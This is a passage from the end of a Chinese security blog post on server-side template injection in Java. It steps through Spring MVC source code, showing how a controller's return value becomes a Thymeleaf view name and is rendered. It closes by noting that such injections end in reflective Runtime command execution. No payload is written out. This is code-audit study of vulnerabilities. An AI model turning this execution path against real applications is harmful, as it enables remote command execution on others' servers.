class="hljs-literal">false</span>);<br>        Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//通过handleReturnValue根据返回值的类型和返回值将不同的属性设置到ModelAndViewContainer中。</span><br>            <span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(returnValue, <span class="hljs-built_in">this</span>.getReturnValueType(returnValue), mavContainer, webRequest);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(<span class="hljs-built_in">this</span>.formatErrorForReturnValue(returnValue), var6);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> var6;<br>       <br></code></pre></td></tr></table></figure>

<p>下面分析<code>handleReturnValue</code>方法。</p>
<ul>
<li><code>selectHandler</code>根据返回值和类型找到不同的<code>HandlerMethodReturnValueHandler</code>，这里得到了<code>ViewNameMethodReturnValueHandler</code>,具体怎么得到的就不分析了。</li>
<li>调用<code>handler.handleReturnValue</code>，这里得到不同的<code>HandlerMethodReturnValueHandler</code>处理的方式也不相同。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取handler</span><br>        <span class="hljs-type">HandlerMethodReturnValueHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.selectHandler(returnValue, returnType);<br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//执行handleReturnValue操作</span><br>            handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ViewNameMethodReturnValueHandler#handleReturnValue</p>
<ul>
<li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li>
<li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (returnValue <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> returnValue.toString();<br>            <span class="hljs-comment">//设置返回值为viewName</span><br>            mavContainer.setViewName(viewName);<br>            <span class="hljs-comment">//判断是否需要重定向</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRedirectViewName(viewName)) &#123;<br>                mavContainer.setRedirectModelScenario(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (returnValue != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">&quot;Unexpected return type: &quot;</span> + returnType.getParameterType().getName() + <span class="hljs-string">&quot; in method: &quot;</span> + returnType.getMethod());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>通过上面的操作，将返回值设置为<code>mavContainer.viewName</code>,执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象。</p>
<p><code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回。</p>
<p><img src="/img/ssti(java)/ssti44.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="View-Resolver-与执行模板渲染"><a href="#View-Resolver-与执行模板渲染" class="headerlink" title="View Resolver 与执行模板渲染"></a>View Resolver 与执行模板渲染</h4><p>获取<code>ModelAndView</code>后，通过<code>DispatcherServlet#render</code>获取视图解析器并渲染。</p>
<p>看到712行引用自己的模板引擎渲染</p>
<p><img src="/img/ssti(java)/ssti45.png" srcset="/img/loading.gif" lazyload></p>
<p>跳转到模板的render方法</p>
<p><img src="/img/ssti(java)/ssti46.png" srcset="/img/loading.gif" lazyload></p>
<p>因为我们用的是 Thymeleaf 模版引擎，所以 view.render 找到对应的视图 <strong>ThymeleafView 的 render 方法</strong>进行渲染。</p>
<p>ThymeleafView 的 render 方法又调用 <strong>renderFragment</strong> 方法进行视图渲染，渲染完成之后，DispatcherServlet 就可以将结果返回给我们了。</p>
<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol>
<li>动态调试一般适用于反复查看漏洞关键点不同的参数情况以及传参过程，代码执行情况调用的函数等一些比较大的方向看调用栈即可，一步步调试很容易乱</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>三个模板漏洞都是在渲染代码中触发漏洞，走入对应的render渲染方法开始，最终走到Method类的invoke方法利用java反射调用runtime(或其他)方法执行exec命令后结束</p>
</li>
<li><p>将配置的拦截器加入到执行链中去，在<strong>getHandlerExecutionChain</strong> 方法</p>
</li>
<li><p>分析源码真的很需要耐心，得一步步慢慢调试才能进入关键函数</p>
</li>
</ol>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0">Java OWASP SSTI 学习 | Drunkbaby’s Blog (drun1baby.top)</a></li>
<li><a target="_blank" rel="noopener" href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocity的SSTI复现与分析 (garck3h.github.io)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9962">Thymeleaf SSTI漏洞分析-先知社区 (aliyun.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021848063#item-2-3">spring-mvc - 深入源码分析SpringMVC执行过程 - 后端技术社区 - SegmentFault 思否</a></li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">Java代码审计</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java代码审计</a>
      
        <a href="/tags/OWASP/" class="print-no-link">#OWASP</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Java代码审计中的SSTI</div>
      <div>http://huang-d1.github.io/2025/07/16/java代码审计中的SSTI/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>huangdi</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年7月16日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/" title="wuzhicms-4.1.0 代码审计(php)">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">wuzhicms-4.1.0 代码审计(php)</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/" title="OFCMS 1.1.3 代码审计(Java)">
                        <span class="hidden-mobile">OFCMS 1.1.3 代码审计(Java)</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
